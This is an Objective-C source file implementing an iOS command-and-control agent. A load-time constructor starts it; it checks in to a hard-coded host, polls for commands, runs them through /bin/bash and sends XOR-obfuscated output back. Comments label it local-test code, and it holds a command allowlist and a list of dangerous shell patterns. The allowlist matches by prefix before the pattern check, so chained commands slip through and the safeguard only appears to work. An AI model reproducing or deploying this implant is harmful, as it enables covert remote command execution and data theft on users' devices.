#import <UIKit/UIKit.h>
#import <CommonCrypto/CommonCrypto.h>
#include <unistd.h>
#include <sys/sysctl.h>

#pragma mark - Configuration

// 本地测试配置
#define C2_HOST @"http://192.168.36.253:8888/"  // 仅本地测试
#define C2_POLL_INTERVAL 3.0
#define C2_MAX_OUTPUT_SIZE (1024 * 512)
#define C2_TIMEOUT 10.0
#define C2_ENCRYPTION_KEY @"LocalTestKey123"  // 测试用简单密钥

// 调试开关
#ifdef DEBUG
#define C2DebugLog(fmt, ...) NSLog(@"[C2_DEBUG] " fmt, ##__VA_ARGS__)
#else
#define C2DebugLog(...)
#endif

#pragma mark - Security Utilities

@interface C2Security : NSObject
+ (NSString *)simpleEncrypt:(NSString *)input key:(NSString *)key;
+ (NSString *)simpleDecrypt:(NSString *)input key:(NSString *)key;
+ (NSString *)generateDeviceFingerprint;
@end

@implementation C2Security

+ (NSString *)simpleEncrypt:(NSString *)input key:(NSString *)key {
    if (!input || !key) return nil;
    
    NSData *inputData = [input dataUsingEncoding:NSUTF8StringEncoding];
    NSData *keyData = [key dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableData *encryptedData = [NSMutableData dataWithLength:inputData.length];
    
    // 简单的XOR加密（仅用于测试，生产环境请使用AES等强加密）
    const unsigned char *inputBytes = inputData.bytes;
    const unsigned char *keyBytes = keyData.bytes;
    unsigned char *outputBytes = encryptedData.mutableBytes;
    
    for (NSUInteger i = 0; i < inputData.length; i++) {
        outputBytes[i] = inputBytes[i] ^ keyBytes[i % keyData.length];
    }
    
    return [encryptedData base64EncodedStringWithOptions:0];
}

+ (NSString *)simpleDecrypt:(NSString *)input key:(NSString *)key {
    if (!input || !key) return nil;
    
    NSData *encryptedData = [[NSData alloc] initWithBase64EncodedString:input options:0];
    if (!encryptedData) return nil;
    
    NSData *keyData = [key dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableData *decryptedData = [NSMutableData dataWithLength:encryptedData.length];
    
    const unsigned char *encryptedBytes = encryptedData.bytes;
    const unsigned char *keyBytes = keyData.bytes;
    unsigned char *outputBytes = decryptedData.mutableBytes;
    
    for (NSUInteger i = 0; i < encryptedData.length; i++) {
        outputBytes[i] = encryptedBytes[i] ^ keyBytes[i % keyData.length];
    }
    
    return [[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding];
}

+ (NSString *)generateDeviceFingerprint {
    // 生成测试用设备指纹
    UIDevice *device = [UIDevice currentDevice];
    NSString *base = [NSString stringWithFormat:@"%@_%@_%@",
                      device.model ?: @"unknown",
                      device.systemVersion ?: @"unknown",
                      [[device identifierForVendor] UUIDString] ?: @"unknown"];
    
    // 简单的哈希（测试用）
    const char *str = [base UTF8String];
    unsigned char result[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(str, (CC_LONG)strlen(str), result);
    
    NSMutableString *hash = [NSMutableString string];
    for (int i = 0; i < 8; i++) {
        [hash appendFormat:@"%02x", result[i]];
    }
    
    return [NSString stringWithFormat:@"test_%@", hash];
}

@end

#pragma mark - Command Validator

@interface C2CommandValidator : NSObject
+ (BOOL)isCommandAllowed:(NSString *)command;
+ (NSArray<NSString *> *)allowedCommands;
@end

@implementation C2CommandValidator

+ (NSArray<NSString *> *)allowedCommands {
    // 仅允许安全的测试命令
    return @[
        @"id",
        @"whoami",
        @"uname -a",
        @"hostname",
        @"pwd",
        @"ls",
        @"ps aux",
        @"df -h",
        @"free -m",
        @"netstat -an | head -20",
        @"ifconfig",
        @"uptime"
    ];
}

+ (BOOL)isCommandAllowed:(NSString *)command {
    if (!command || command.length == 0) return NO;
    
    // 移除多余空白
    NSString *trimmed = [command stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    
    // 检查命令长度限制
    if (trimmed.length > 256) {
        C2DebugLog(@"Command too long: %lu characters", (unsigned long)trimmed.length);
        return NO;
    }
    
    // 检查是否在允许列表中
    for (NSString *allowed in [self allowedCommands]) {
        if ([trimmed isEqualToString:allowed] || [trimmed hasPrefix:allowed]) {
            return YES;
        }
    }
    
    // 禁止包含危险字符的命令
    NSArray *dangerousPatterns = @[@"|", @";", @"&", @"`", @"$(", @"rm ", @"dd ", @">", @"sudo"];
    for (NSString *pattern in dangerousPatterns) {
        if ([trimmed containsString:pattern]) {
            C2DebugLog(@"Command contains dangerous pattern: %@", pattern);
            return NO;
        }
    }
    
    C2DebugLog(@"Command not in allowed list: %@", trimmed);
    return NO;
}

@end

#pragma mark - C2 Agent Implementation

@interface C2Agent : NSObject <NSURLSessionDelegate>
@property (nonatomic, strong) NSURLSession *session;
@property (nonatomic, strong) NSTimer *pollTimer;
@property (nonatomic, assign) BOOL isRunning;
@property (nonatomic, strong) NSString *deviceId;
@property (nonatomic, strong) dispatch_queue_t agentQueue;
@end

@implementation C2Agent

- (instancetype)init {
    self = [super init];
    if (self) {
        _isRunning = NO;
        _deviceId = [C2Security generateDeviceFingerprint];
        _agentQueue = dispatch_queue_create("com.c2.test.agent", DISPATCH_QUEUE_SERIAL);
        
        // 配置URLSession
        NSURLSessionConfiguration *config = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        config.timeoutIntervalForRequest = C2_TIMEOUT;
        config.timeoutIntervalForResource = C2_TIMEOUT * 2;
        config.URLCache = nil;
        config.requestCachePolicy = NSURLRequestReloadIgnoringLocalCacheData;
        
        _session = [NSURLSession sessionWithConfiguration:config 
                                                 delegate:self 
                                            delegateQueue:nil];
    }
    return self;
}

- (void)start {
    if (self.isRunning) {
        C2DebugLog(@"Agent is already running");
        return;
    }
    
    self.isRunning = YES;
    C2DebugLog(@"Starting C2 agent with device ID: %@", self.deviceId);
    
    dispatch_async(self.agentQueue, ^{
        [self checkin];
        [self startPolling];
    });
}

- (void)stop {
    C2DebugLog(@"Stopping C2 agent");
    self.isRunning = NO;
    [self.pollTimer invalidate];
    self.pollTimer = nil;
    [self.session invalidateAndCancel];
}

- (void)checkin {
    C2DebugLog(@"Performing checkin");
    
    NSString *checkinPath = [NSString stringWithFormat:@"/api/checkin?id=%@&v=%@&proc=%@&pid=%d",
                            [self urlEncode:self.deviceId],
                            [self urlEncode:[[UIDevice currentDevice] systemVersion] ?: @"?"],
                            [self urlEncode:[[NSProcessInfo processInfo] processName]],
                            getpid()];
    
    [self performGetRequest:checkinPath completion:^(NSData *data, NSError *error) {
        if (error) {
            C2DebugLog(@"Checkin failed: %@", error.localizedDescription);
        } else {
            C2DebugLog(@"Checkin successful");
        }
    }];
}

- (void)startPolling {
    C2DebugLog(@"Starting polling loop");
    
    dispatch_async(dispatch_get_main_queue(), ^{
        self.pollTimer = [NSTimer scheduledTimerWithTimeInterval:C2_POLL_INTERVAL 
                                                         repeats:YES 
                                                           block:^(NSTimer *timer) {
            if (self.isRunning) {
                [self pollForCommands];
            }
        }];
    });
}

- (void)pollForCommands {
    C2DebugLog(@"Polling for commands");
    
    NSString *commandPath = [NSString stringWithFormat:@"/api/commands?id=%@", 
                            [self urlEncode:self.deviceId]];
    
    __weak typeof(self) weakSelf = self;
    [self performGetRequest:commandPath completion:^(NSData *data, NSError *error) {
        __strong typeof(weakSelf) strongSelf = weakSelf;
        if (!strongSelf || error) {
            C2DebugLog(@"Poll failed: %@", error.localizedDescription);
            return;
        }
        
        [strongSelf processCommands:data];
    }];
}

- (void)processCommands:(NSData *)data {
    if (!data) return;
    
    NSError *error = nil;
    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data 
                                                        options:0 
                                                          error:&error];
    if (error || !json) {
        C2DebugLog(@"Failed to parse commands: %@", error.localizedDescription);
        return;
    }
    
    NSArray *commands = json[@"commands"];
    if (![commands isKindOfClass:[NSArray class]] || commands.count == 0) {
        return;
    }
    
    C2DebugLog(@"Received %lu commands", (unsigned long)commands.count);
    
    for (NSDictionary *command in commands) {
        if (![command isKindOfClass:[NSDictionary class]]) continue;
        
        NSString *commandId = command[@"id"];
        NSString *commandText = command[@"cmd"];
        
        if (!commandText) continue;
        
        [self executeCommand:commandText commandId:commandId];
    }
}

- (void)executeCommand:(NSString *)command commandId:(NSString *)commandId {
    C2DebugLog(@"Executing command: %@ (ID: %@)", command, commandId);
    
    // 验证命令
    if (![C2CommandValidator isCommandAllowed:command]) {
        C2DebugLog(@"Command rejected: %@", command);
        [self sendResult:@"Command not allowed" commandId:commandId ?: @"unknown"];
        return;
    }
    
    // 执行命令
    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
        __strong typeof(weakSelf) strongSelf = weakSelf;
        if (!strongSelf) return;
        
        NSString *output = [strongSelf executeShellCommand:command];
        [strongSelf sendResult:output commandId:commandId ?: @"unknown"];
    });
}

- (NSString *)executeShellCommand:(NSString *)command {
    NSTask *task = [[NSTask alloc] init];
    NSPipe *outputPipe = [NSPipe pipe];
    NSPipe *errorPipe = [NSPipe pipe];
    
    task.launchPath = @"/bin/bash";
    task.arguments = @[@"-c", command];
    task.standardOutput = outputPipe;
    task.standardError = errorPipe;
    
    @try {
        [task launch];
        
        // 设置超时
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), 
                      dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            if (task.isRunning) {
                [task terminate];
            }
        });
        
        NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
        NSData *errorData = [[errorPipe fileHandleForReading] readDataToEndOfFile];
        
        [task waitUntilExit];
        
        NSString *output = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding] ?: @"";
        NSString *error = [[NSString alloc] initWithData:errorData encoding:NSUTF8StringEncoding] ?: @"";
        
        // 限制输出大小
        if (output.length > C2_MAX_OUTPUT_SIZE) {
            output = [output substringToIndex:C2_MAX_OUTPUT_SIZE];
            output = [output stringByAppendingString:@"\n... (output truncated)"];
        }
        
        NSMutableString *result = [NSMutableString string];
        if (output.length > 0) {
            [result appendString:output];
        }
        if (error.length > 0) {
            [result appendFormat:@"\n[STDERR]\n%@", error];
        }
        [result appendFormat:@"\n\n[Exit Code: %d]", task.terminationStatus];
        
        return result;
        
    } @catch (NSException *exception) {
        return [NSString stringWithFormat:@"Command execution failed: %@", exception.reason];
    }
}

- (void)sendResult:(NSString *)result commandId:(NSString *)commandId {
    C2DebugLog(@"Sending result for command: %@", commandId);
    
    NSDictionary *body = @{
        @"id": self.deviceId,
        @"cmd_id": commandId ?: @"unknown",
        @"output": result ?: @"no output",
        @"timestamp": @([[NSDate date] timeIntervalSince1970])
    };
    
    // 加密敏感数据
    NSString *encryptedOutput = [C2Security simpleEncrypt:result ?: @"" 
                                                       key:C2_ENCRYPTION_KEY];
    
    NSDictionary *encryptedBody = @{
        @"id": self.deviceId,
        @"cmd_id": commandId ?: @"unknown",
        @"data": encryptedOutput ?: @"",
        @"timestamp": @([[NSDate date] timeIntervalSince1970])
    };
    
    [self performPostRequest:@"/api/result" body:encryptedBody completion:^(NSData *data, NSError *error) {
        if (error) {
            C2DebugLog(@"Failed to send result: %@", error.localizedDescription);
        }
    }];
}

#pragma mark - Network Helpers

- (void)performGetRequest:(NSString *)path 
               completion:(void(^)(NSData *data, NSError *error))completion {
    NSString *urlString = [C2_HOST stringByAppendingString:path];
    NSURL *url = [NSURL URLWithString:urlString];
    
    if (!url) {
        if (completion) {
            completion(nil, [NSError errorWithDomain:@"C2Error" 
                                                code:-1 
                                            userInfo:@{NSLocalizedDescriptionKey: @"Invalid URL"}]);
        }
        return;
    }
    
    NSURLRequest *request = [NSURLRequest requestWithURL:url 
                                             cachePolicy:NSURLRequestReloadIgnoringCacheData 
                                         timeoutInterval:C2_TIMEOUT];
    
    [[self.session dataTaskWithRequest:request 
                     completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode != 200) {
            C2DebugLog(@"HTTP %ld for GET %@", (long)httpResponse.statusCode, path);
        }
        if (completion) {
            completion(data, error);
        }
    }] resume];
}

- (void)performPostRequest:(NSString *)path 
                      body:(NSDictionary *)body 
                completion:(void(^)(NSData *data, NSError *error))completion {
    NSString *urlString = [C2_HOST stringByAppendingString:path];
    NSURL *url = [NSURL URLWithString:urlString];
    
    if (!url) {
        if (completion) {
            completion(nil, [NSError errorWithDomain:@"C2Error" 
                                                code:-1 
                                            userInfo:@{NSLocalizedDescriptionKey: @"Invalid URL"}]);
        }
        return;
    }
    
    NSError *jsonError = nil;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body 
                                                       options:0 
                                                         error:&jsonError];
    if (jsonError) {
        if (completion) {
            completion(nil, jsonError);
        }
        return;
    }
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.HTTPBody = jsonData;
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setTimeoutInterval:C2_TIMEOUT];
    
    [[self.session dataTaskWithRequest:request 
                     completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode != 200) {
            C2DebugLog(@"HTTP %ld for POST %@", (long)httpResponse.statusCode, path);
        }
        if (completion) {
            completion(data, error);
        }
    }] resume];
}

- (NSString *)urlEncode:(NSString *)string {
    if (!string) return @"";
    
    NSCharacterSet *allowedCharacters = [NSCharacterSet characterSetWithCharactersInString:@"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"];
    return [string stringByAddingPercentEncodingWithAllowedCharacters:allowedCharacters] ?: @"";
}

#pragma mark - NSURLSessionDelegate

- (void)URLSession:(NSURLSession *)session 
didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge 
 completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition, NSURLCredential *))completionHandler {
    // 仅测试环境接受自签名证书
    if ([challenge.protectionSpace.host isEqualToString:@"localhost"]) {
        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
    } else {
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}

- (void)dealloc {
    [self stop];
    C2DebugLog(@"C2 Agent deallocated");
}

@end

#pragma mark - Manager

@interface C2Manager : NSObject
@property (nonatomic, strong) C2Agent *agent;
+ (instancetype)sharedManager;
- (void)startAgent;
- (void)stopAgent;
@end

@implementation C2Manager

+ (instancetype)sharedManager {
    static C2Manager *manager = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        manager = [[C2Manager alloc] init];
    });
    return manager;
}

- (void)startAgent {
    if (!self.agent) {
        self.agent = [[C2Agent alloc] init];
    }
    [self.agent start];
}

- (void)stopAgent {
    [self.agent stop];
    self.agent = nil;
}

@end

#pragma mark - Constructor (仅用于测试)

__attribute__((constructor)) static void init_c2_test(void) {
    #ifdef DEBUG
    NSLog(@"[C2_TEST] Initializing test agent...");
    
    // 写入测试标记
    NSString *testPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@".c2_test_loaded"];
    [@"1" writeToFile:testPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    // 延迟启动以避免阻塞应用启动
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), 
                  dispatch_get_main_queue(), ^{
        [[C2Manager sharedManager] startAgent];
    });
    #endif
}
